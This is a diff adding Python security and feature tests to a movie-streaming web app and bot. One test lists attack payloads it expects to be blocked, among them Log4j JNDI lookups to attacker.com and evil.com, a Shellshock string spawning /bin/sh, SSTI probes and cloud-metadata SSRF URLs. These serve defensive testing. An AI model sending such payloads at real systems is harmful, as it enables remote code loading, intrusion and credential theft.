@@ -606,3 +606,165 @@ def test_branding_integrity_in_security():
     assert "dilbarzakirova" not in content
     assert "zakirova" not in content
     assert "zakirov" not in content
+
+
+# =====================================================================
+# 9. TEZKOR MASTER THREAT DETECTION (LOG4J, SSTI, SHELLSHOCK, PROTO, SSRF)
+# =====================================================================
+@pytest.mark.asyncio
+async def test_advanced_threat_detection_log4j_ssti_shellshock_proto_ssrf():
+    """Barcha global xavfli xakerlik kodlari (Log4j, SSTI, Shellshock, Prototype Pollution, Cloud SSRF) 1-taktda 403 Forbidden qaytarishi kerak."""
+    app = create_web_app()
+    server = TestServer(app)
+    client = TestClient(server)
+    await client.start_server()
+
+    advanced_attacks = [
+        # Log4j JNDI injection
+        "/api/movies?q=${jndi:ldap://attacker.com/exploit}",
+        "/api/movies?q=${jndi:rmi://127.0.0.1:1099/obj}",
+        # SSTI (Server Side Template Injection)
+        "/api/movies?q={{7*7}}",
+        "/api/movies?q={{config}}",
+        "/api/movies?q=${7*7}",
+        # Shellshock
+        "/api/movies?q=() { :; }; /bin/sh -i",
+        # Prototype Pollution
+        "/api/movies?__proto__[polluted]=true",
+        # Cloud Metadata SSRF
+        "/api/movies?target=http://169.254.169.254/latest/meta-data/",
+        "/api/movies?url=http://metadata.google.internal/computeMetadata/v1/",
+    ]
+
+    try:
+        for attack in advanced_attacks:
+            resp = await client.get(attack)
+            assert resp.status == 403, f"Xavfli hujum {attack} bloklanmadi! Status: {resp.status}"
+            data = await resp.json()
+            assert data["ok"] is False
+            assert data["error"] == "forbidden"
+
+        # POST body orqali Log4j / SSTI / Prototype Pollution
+        resp_post1 = await client.post("/api/watch", json={"movie_code": "${jndi:ldap://evil.com/x}"})
+        assert resp_post1.status == 403
+        resp_post2 = await client.post("/api/watch", json={"__proto__": {"admin": True}})
+        assert resp_post2.status == 403
+    finally:
+        await client.close()
+
+
+# =====================================================================
+# 10. ISHONCHLI PROKSI VA HAQIQIY MIJOZ IP MANZILI HIMOYA TESTI
+# =====================================================================
+@pytest.mark.asyncio
+async def test_trusted_proxy_protection_and_real_client_ip():
+    """
+    Ishonchli proksilar (Render, Cloudflare, localhost) hech qachon jail ga tushmasligi,
+    get_real_client_ip esa proksilarni suzib haqiqiy mijoz IP manzilini to'g'ri ajratishi kerak.
+    """
+    from services.security_service import is_trusted_proxy, get_real_client_ip
+
+    # 1. is_trusted_proxy tekshiruvlari
+    assert is_trusted_proxy("127.0.0.1") is True
+    assert is_trusted_proxy("::1") is True
+    assert is_trusted_proxy("localhost") is True
+    assert is_trusted_proxy("10.0.4.15") is True        # Render / Private network
+    assert is_trusted_proxy("172.20.0.1") is True       # Private network
+    assert is_trusted_proxy("192.168.1.100") is True    # Private network
+    assert is_trusted_proxy("169.254.10.1") is True     # Link-local
+    assert is_trusted_proxy("172.64.10.5") is True      # Cloudflare range
+    assert is_trusted_proxy("104.16.2.1") is True       # Cloudflare range
+    assert is_trusted_proxy("198.51.100.88") is False   # Begona tashqi IP
+    assert is_trusted_proxy("203.0.113.19") is False    # Begona tashqi IP
+
+    # 2. jail_ip ishonchli proksini hech qachon jail ga tiqmasligi
+    security_service.reset_jail()
+    security_service.ban_ip("10.0.0.1")
+    security_service.ban_ip("172.64.0.1")
+    assert security_service.is_ip_banned("10.0.0.1")[0] is False
+    assert security_service.is_ip_banned("172.64.0.1")[0] is False
+
+    # Begona tajovuzkor IP esa to'g'ri jail ga tushishi
+    security_service.ban_ip("203.0.113.55")
+    assert security_service.is_ip_banned("203.0.113.55")[0] is True
+
+    # 3. get_real_client_ip sinovi
+    app = create_web_app()
+    server = TestServer(app)
+    client = TestClient(server)
+    await client.start_server()
+
+    try:
+        # XFF zanjirida Cloudflare va Render ichki proksilari bo'lganda tashqi mijoz IP olinishi
+        resp = await client.get(
+            "/health",
+            headers={"X-Forwarded-For": "203.0.113.99, 10.0.0.5, 172.64.1.1"}
+        )
+        assert resp.status == 200
+
+        # CF-Connecting-IP
+        resp_cf = await client.get(
+            "/health",
+            headers={"CF-Connecting-IP": "198.51.100.77"}
+        )
+        assert resp_cf.status == 200
+    finally:
+        await client.close()
+
+
+# =====================================================================
+# 11. TV ENDPOINTS VA KINO 1-QISM YETKAZISH TESTI
+# =====================================================================
+@pytest.mark.asyncio
+async def test_tv_endpoints_and_movie_part1_streaming_delivery():
+    """TV endpointlari (/api/tv, /p/tv/1) va kinoning 1-qismi video streaming bilan yetkazilishi."""
+    app = create_web_app()
+    server = TestServer(app)
+    client = TestClient(server)
+    await client.start_server()
+
+    try:
+        # 1. /api/tv va /p/tv/{id}
+        r_tv = await client.get("/api/tv", headers={"User-Agent": "Mozilla/5.0"})
+        assert r_tv.status == 200
+        tv_data = await r_tv.json()
+        assert tv_data["total"] >= 150
+
+        r_icon = await client.get("/p/tv/1", headers={"User-Agent": "Mozilla/5.0"})
+        assert r_icon.status == 200
+        assert "image/svg+xml" in r_icon.headers.get("Content-Type", "")
+
+        # 2. 1-qism va serial qismlarini haqiqiy video bilan yetkazish testi
+        from services.movie_service import movie_service
+        bot_mock = AsyncMock()
+        sent_mock = MagicMock()
+        sent_mock.video = MagicMock(file_id="BAACAgIAAxkBAAE_SAMPLE_REAL_717", duration=90, file_size=12000000)
+        bot_mock.send_video = AsyncMock(return_value=sent_mock)
+        bot_mock.send_photo = AsyncMock()
+        bot_mock.send_message = AsyncMock()
+
+        # Serial (masalan 717 - Attack on Titan 1-qism)
+        res_part1 = await movie_service.deliver_movie(
+            bot=bot_mock,
+            chat_id=12345678,
+            code="717",
+            part=1
+        )
+        assert res_part1 is True
+        assert bot_mock.send_video.called
+        call_kwargs = bot_mock.send_video.call_args.kwargs
+        assert call_kwargs.get("supports_streaming") is True
+        caption = call_kwargs.get("caption", "")
+        assert "1-qism" in caption
+        assert config.CHANNEL_USERNAME in caption
+        assert config.BOT_USERNAME.lstrip("@") in caption
+        assert "Zakirov" not in caption
+
+        # 3. extract_movie_code_and_part orqali '101 1-qism ko'rish' testi
+        from handlers.movies import extract_movie_code_and_part
+        assert extract_movie_code_and_part("101 1-qism ko'rish") == ("101", 1)
+        assert extract_movie_code_and_part("101 1 qism korish") == ("101", 1)
+        assert extract_movie_code_and_part("717 2-qism tomosha") == ("717", 2)
+    finally:
+        await client.close()
+
